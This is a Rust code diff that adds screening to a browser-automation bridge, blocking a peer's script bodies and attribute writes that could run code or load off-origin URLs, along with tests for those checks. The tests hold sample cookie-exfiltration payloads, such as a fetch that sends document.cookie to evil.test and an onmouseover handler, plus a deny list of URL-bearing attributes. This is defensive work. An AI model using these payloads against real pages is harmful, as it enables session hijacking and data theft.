@@ -426,6 +426,76 @@ fn is_origin_allowed(origin: Option<&str>) -> bool {
     matches!(host, "localhost" | "127.0.0.1" | "[::1]")
 }
 
+/// CLAUDE-SECURITY F2: a bridge peer's script body is the same untrusted
+/// input the AGI and IPC paths screen, and the capability grant only says the
+/// peer may run *a* script — not that this one is safe. Screening here makes
+/// the content screen a property of the sink instead of a property of one
+/// caller.
+fn ensure_peer_script_allowed(script: &str) -> Result<(), String> {
+    crate::sys::security::tool_guard::ToolExecutionGuard::screen_browser_script(script)
+        .map_err(|reason| format!("Blocked browser script: it may not use {reason}"))
+}
+
+/// Attributes that run code or load a URL. `setAttribute('onmouseover', …)`
+/// plus a dispatched event is script execution written without the word
+/// `script`, and a URL attribute pointed off origin is the same exfiltration
+/// the script screen refuses, so the peer may only write inert markup.
+fn ensure_peer_attribute_write_allowed(attribute: &str, value: &str) -> Result<(), String> {
+    const URL_BEARING_ATTRIBUTES: &[&str] = &[
+        "src",
+        "srcset",
+        "href",
+        "xlink:href",
+        "action",
+        "formaction",
+        "data",
+        "srcdoc",
+        "poster",
+        "background",
+        "ping",
+        "cite",
+        "codebase",
+        "longdesc",
+        "manifest",
+        "profile",
+        "usemap",
+        "style",
+        "content",
+    ];
+
+    let name = attribute.trim().to_lowercase();
+    if name.starts_with("on") {
+        return Err(format!(
+            "Blocked attribute write: '{name}' is an event handler, which runs script in the page."
+        ));
+    }
+    if URL_BEARING_ATTRIBUTES.contains(&name.as_str()) {
+        return Err(format!(
+            "Blocked attribute write: '{name}' makes the page load a URL it was not asked to load."
+        ));
+    }
+
+    let condensed: String = value
+        .chars()
+        .filter(|current| !current.is_whitespace())
+        .collect::<String>()
+        .to_lowercase();
+    if condensed.contains("://")
+        || condensed.contains("javascript:")
+        || condensed.contains("data:")
+        || condensed.contains("vbscript:")
+        || condensed.starts_with("//")
+        || condensed.contains('<')
+    {
+        return Err(
+            "Blocked attribute write: the value carries a URL or markup the page would load."
+                .to_string(),
+        );
+    }
+
+    Ok(())
+}
+
 /// Duration the server waits for the first auth message before closing.
 const AUTH_TIMEOUT: Duration = Duration::from_secs(2);
 // ─────────────────────────────────────────────────────────────────────────────
@@ -2092,6 +2162,7 @@ impl RealtimeServer {
                 value,
                 tab_id,
             } => {
+                ensure_peer_attribute_write_allowed(&attribute, &value)?;
                 let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                 let (client, resolved_tab_id) =
                     Self::get_native_cdp_client(app, tab_id, false, None).await?;
@@ -2391,6 +2462,7 @@ impl RealtimeServer {
             }
 
             NativeMessage::ExecuteScript { script, tab_id } => {
+                ensure_peer_script_allowed(&script)?;
                 let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
                 let (client, resolved_tab_id) =
                     Self::get_native_cdp_client(app, tab_id, false, None).await?;
@@ -3703,6 +3775,103 @@ mod tests {
                 Some(NativeCapability::ScriptExecution)
             );
         }
+    }
+
+    fn script_execution_granted() -> ExtensionCapabilities {
+        ExtensionCapabilities {
+            supports_script_execution: true,
+            ..ExtensionCapabilities::none()
+        }
+    }
+
+    /// CLAUDE-SECURITY F2: the grant says the peer may run *a* script; it never
+    /// said which one. The body reached `client.evaluate` unread, so the
+    /// content screen the AGI and IPC paths run was a property of those callers
+    /// rather than of the sink. The screen runs before the app handle is
+    /// resolved, so "Desktop app handle unavailable" means the body got past it.
+    #[tokio::test]
+    async fn a_peer_holding_the_script_grant_still_cannot_exfiltrate_the_session() {
+        for script in [
+            "fetch('https://evil.test/x',{method:'POST',body:document.cookie})",
+            "const o={};o.l=location;o.l.host='evil.test'",
+        ] {
+            let error = RealtimeServer::execute_native_message(
+                json!({ "type": "execute_script", "script": script, "tab_id": null }),
+                None,
+                &script_execution_granted(),
+            )
+            .await
+            .expect_err("an unscreened script body reached the page");
+            assert!(
+                error.starts_with("Blocked browser script:"),
+                "expected the content screen to refuse {script}, got: {error}"
+            );
+        }
+
+        let allowed = RealtimeServer::execute_native_message(
+            json!({ "type": "execute_script", "script": "return document.title", "tab_id": null }),
+            None,
+            &script_execution_granted(),
+        )
+        .await
+        .expect_err("no app handle is available in tests");
+        assert!(
+            allowed.contains("Desktop app handle"),
+            "a plain DOM read must still reach the browser: {allowed}"
+        );
+    }
+
+    /// An attribute write is script execution spelled without the word:
+    /// `onmouseover` runs on the next hover, and a URL attribute submits or
+    /// loads off origin.
+    #[tokio::test]
+    async fn a_peer_may_not_write_an_event_handler_or_a_url_attribute() {
+        for (attribute, value) in [
+            (
+                "onmouseover",
+                "fetch('https://evil.test/x?c='+document.cookie)",
+            ),
+            ("href", "https://evil.test/collect"),
+            ("action", "https://evil.test/collect"),
+            ("style", "background:url(https://evil.test/x)"),
+            ("data-note", "https://evil.test/collect"),
+        ] {
+            let error = RealtimeServer::execute_native_message(
+                json!({
+                    "type": "set_attribute",
+                    "selector": "body",
+                    "attribute": attribute,
+                    "value": value,
+                    "tab_id": null
+                }),
+                None,
+                &script_execution_granted(),
+            )
+            .await
+            .expect_err("an unscreened attribute write reached the page");
+            assert!(
+                error.starts_with("Blocked attribute write:"),
+                "expected the attribute screen to refuse {attribute}, got: {error}"
+            );
+        }
+
+        let allowed = RealtimeServer::execute_native_message(
+            json!({
+                "type": "set_attribute",
+                "selector": "input[name=first]",
+                "attribute": "value",
+                "value": "Ada",
+                "tab_id": null
+            }),
+            None,
+            &script_execution_granted(),
+        )
+        .await
+        .expect_err("no app handle is available in tests");
+        assert!(
+            allowed.contains("Desktop app handle"),
+            "filling a form field must still reach the browser: {allowed}"
+        );
     }
 
     // ── F23: where a bridge peer may drive the browser ──────────────────────
